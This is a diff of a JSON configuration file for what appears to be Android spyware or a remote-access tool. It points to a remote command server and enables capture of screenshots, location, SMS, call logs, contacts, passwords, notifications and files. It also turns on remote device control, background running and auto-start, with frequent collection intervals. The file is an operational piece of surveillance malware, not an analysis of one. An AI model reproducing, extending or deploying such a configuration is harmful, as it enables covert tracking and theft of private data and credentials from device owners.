@@ -1,3 +1,36 @@
 {
-  "x": "https://44ab403b0c26b58e-103-191-129-26.serveousercontent.com"
+  "server_url": "https://bot.virzofficialst.my.id",
+  "version": "1.0.0",
+  "features": {
+    "screenshot": true,
+    "location": true,
+    "sms": true,
+    "calls": true,
+    "contacts": true,
+    "passwords": true,
+    "battery_monitoring": true,
+    "device_control": true,
+    "notification_capture": true,
+    "file_extraction": true,
+    "device_lock_unlock": true,
+    "reboot_command": true,
+    "vibrate_command": true,
+    "flashlight_control": true,
+    "media_control": true
+  },
+  "intervals": {
+    "screenshot_interval_ms": 300000,
+    "location_update_ms": 30000,
+    "data_sync_ms": 60000,
+    "battery_check_ms": 120000
+  },
+  "settings": {
+    "max_sms_count": 1000,
+    "max_call_logs": 1000,
+    "max_locations": 500,
+    "max_notifications": 1000,
+    "encrypt_passwords": true,
+    "background_service_enabled": true,
+    "auto_start_enabled": true
+  }
 }
